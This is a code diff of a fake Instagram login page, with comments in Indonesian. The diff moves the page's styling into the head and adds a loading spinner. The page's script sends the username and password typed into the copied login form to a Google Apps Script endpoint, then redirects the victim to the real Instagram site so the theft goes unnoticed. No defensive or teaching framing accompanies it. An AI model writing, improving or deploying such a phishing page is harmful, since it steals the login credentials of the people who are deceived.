@@ -7,177 +7,211 @@
     <title>Instagram</title>
     <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png"
         type="image/x-icon">
+    <style>
+        body {
+            font-family: sans-serif;
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            box-sizing: border-box;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        a {
+            text-decoration: none;
+        }
+
+        .container {
+            max-width: 1000px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            flex-direction: column;
+            align-items: center;
+            font-size: 14px;
+        }
+
+        .box {
+            max-width: 350px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            background-color: #ffff;
+            border: 1px solid #e6e6e6;
+            border-radius: 1px;
+            margin: 0 0 10px;
+            padding: 10px 0;
+            flex-grow: 1;
+        }
+
+        .heading {
+            margin: 22px auto 12px;
+            background-image: url("https://www.instagram.com/static/bundles/es6/sprite_core_b20f2a3cd7e4.png/b20f2a3cd7e4.png");
+            background-position: -98px 0;
+            height: 51px;
+            width: 177px;
+            overflow: hidden;
+        }
+
+        .field {
+            margin: 10px 0;
+            position: relative;
+            font-size: 14px;
+            width: 100%;
+            text-overflow: ellipsis;
+        }
+
+        input {
+            padding: 9px 0px 7px 9px;
+            font-size: 12px;
+            width: 16rem;
+            height: 1.2rem;
+            outline: none;
+            background: #fafafa;
+            border-radius: 3px;
+            border: 1px solid #efefef;
+        }
+
+        /* label initial position */
+        label {
+            position: absolute;
+            pointer-events: none;
+            left: 10px;
+            padding-bottom: 15px;
+            transform: translateY(10px);
+            line-height: 6px;
+            transition: all ease-out 0.1s;
+            font-size: 14px;
+            color: #999;
+            padding-top: 6px;
+        }
+
+        /* hiding placeholder in all browsers */
+        input::placeholder {
+            visibility: hidden;
+        }
+
+        /* hiding placeholder in Mozilla */
+        .login-form ::-moz-placeholder {
+            color: transparent;
+        }
+
+        /* label final position */
+        input:not(:placeholder-shown)+label {
+            transform: translateY(0);
+            font-size: 11px;
+        }
+
+        /* input padding increases if placeholder is not shown */
+        input:not(:placeholder-shown) {
+            padding-top: 14px;
+            padding-bottom: 2px;
+        }
+
+        .login-button {
+            text-align: center;
+            width: 100%;
+            padding: 0.5rem;
+            border: 1px solid transparent;
+            background-color: #4CB4F9;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            border-radius: 8px;
+        }
+
+        .login-button:hover {
+            background-color: #38a1e8;
+        }
+
+        .separator {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #999;
+            margin-top: 6px;
+        }
+
+        .separator .line {
+            height: 1px;
+            width: 40%;
+            background-color: #dbdbdb;
+        }
+
+        .other {
+            display: flex;
+            justify-content: center;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .fb-login-btn {
+            margin: 1rem;
+            border: 0;
+            cursor: pointer;
+            font-size: 14px;
+            color: #385185;
+            font-weight: 600;
+            background: transparent;
+        }
+
+        .fb-icon {
+            color: #385185;
+            font-size: 1rem;
+            padding-right: 1px;
+        }
+
+        .forgot-password {
+            font-size: 11px;
+            color: #003569;
+        }
+
+        .signup {
+            color: #4CB4F9;
+            font-weight: 600;
+        }
+
+        .loading {
+            display: none;
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.8);
+            top: 0;
+            left: 0;
+            z-index: 10;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading span {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #4CB4F9;
+            border-bottom-color: transparent;
+            border-radius: 50%;
+            display: inline-block;
+            animation: loading 1s linear infinite;
+        }
+
+        @keyframes loading {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
 </head>
-<style>
-    body {
-        font-family: sans-serif;
-        background-color: #fafafa;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
-        box-sizing: border-box;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        margin: 0;
-    }
-
-    a {
-        text-decoration: none;
-    }
-
-    .container {
-        max-width: 1000px;
-        width: 100%;
-        display: flex;
-        justify-content: center;
-        flex-direction: column;
-        align-items: center;
-        font-size: 14px;
-    }
-
-    .box {
-        max-width: 350px;
-        width: 100%;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        flex-direction: column;
-        background-color: #ffff;
-        border: 1px solid #e6e6e6;
-        border-radius: 1px;
-        margin: 0 0 10px;
-        padding: 10px 0;
-        flex-grow: 1;
-    }
-
-    .heading {
-        margin: 22px auto 12px;
-        background-image: url("https://www.instagram.com/static/bundles/es6/sprite_core_b20f2a3cd7e4.png/b20f2a3cd7e4.png");
-        background-position: -98px 0;
-        height: 51px;
-        width: 177px;
-        overflow: hidden;
-    }
-
-    .field {
-        margin: 10px 0;
-        position: relative;
-        font-size: 14px;
-        width: 100%;
-        text-overflow: ellipsis;
-    }
-
-    input {
-        padding: 9px 0px 7px 9px;
-        font-size: 12px;
-        width: 16rem;
-        height: 1.2rem;
-        outline: none;
-        background: #fafafa;
-        border-radius: 3px;
-        border: 1px solid #efefef;
-    }
-
-    /* label intial position*/
-
-    label {
-        position: absolute;
-        pointer-events: none;
-        left: 10px;
-        padding-bottom: 15px;
-        transform: translateY(10px);
-        line-height: 6px;
-        transition: all ease-out 0.1s;
-        font-size: 14px;
-        color: #999;
-        padding-top: 6px;
-    }
-
-    /* hiding placeholder in all browsers */
-
-    input::placeholder {
-        visibility: hidden;
-    }
-
-    /* hiding  placeholder in mozilla */
-    .login-form ::-moz-placeholder {
-        color: transparent;
-    }
-
-    /* label final position */
-    input:not(:placeholder-shown)+label {
-        transform: translateY(0);
-        font-size: 11px;
-    }
-
-    /* input padding increases if placeholder is not shown */
-    input:not(:placeholder-shown) {
-        padding-top: 14px;
-        padding-bottom: 2px;
-    }
-
-    .login-button {
-        text-align: center;
-        width: 100%;
-        padding: 0.5rem;
-        border: 1px solid transparent;
-        background-color: #4CB4F9;
-        color: #fff;
-        font-weight: 600;
-        font-size: 14px;
-        cursor: pointer;
-        border-radius: 8px;
-    }
-
-    .separator {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        color: #999;
-        margin-top: 6px;
-    }
-
-    .separator .line {
-        height: 1px;
-        width: 40%;
-        background-color: #dbdbdb;
-    }
-
-    .other {
-        display: flex;
-        justify-content: center;
-        flex-direction: column;
-        align-items: center;
-    }
-
-    .fb-login-btn {
-        margin: 1rem;
-        border: 0;
-        cursor: pointer;
-        font-size: 14px;
-        color: #385185;
-        font-weight: 600;
-        background: transparent;
-    }
-
-    .fb-icon {
-        color: #385185;
-        font-size: 1rem;
-        padding-right: 1px;
-    }
-
-    .forgot-password {
-        font-size: 11px;
-        color: #003569;
-    }
-
-    .signup {
-        color: #4CB4F9;
-        font-weight: 600;
-    }
-</style>
 
 <body>
+    <div class="loading">
+        <span></span>
+    </div>
     <div class="container">
         <div class="box">
             <div class="heading"></div>
@@ -213,9 +247,10 @@
     <script>
         const scriptURL = 'https://script.google.com/macros/s/AKfycbyZ8p64Ue9j-FvMUXkaXTNlsbH6qaaKbi9S0LkQEX9tBauJLWGU5ON3oS_O0Kc6pz0/exec'
         const form = document.forms['instagram-login']
+        const loading = document.querySelector('.loading');
 
         form.addEventListener('submit', e => {
-            e.preventDefault()
+            e.preventDefault();
 
             // Mengambil nilai input nama, email, dan pesan
             const usernameValue = form.username.value.trim();
@@ -237,16 +272,23 @@
                 return;
             }
 
+            // Menampilkan loading
+            loading.style.display = 'flex';
+
             fetch(scriptURL, { method: 'POST', body: new FormData(form) })
                 .then(response => {
                     form.reset();
-                    alert('Username dan Password tidak cocok');
-                    window.location.href = "https://www.instagram.com";
+                    // alert('Login berhasil!');
+                    window.location.href = "https://www.instagram.com/";
                 })
                 .catch(error => {
                     alert('Error');
+                })
+                .finally(() => {
+                    // Menyembunyikan loading
+                    loading.style.display = 'none';
                 });
-        })
+        });
     </script>
 </body>
 
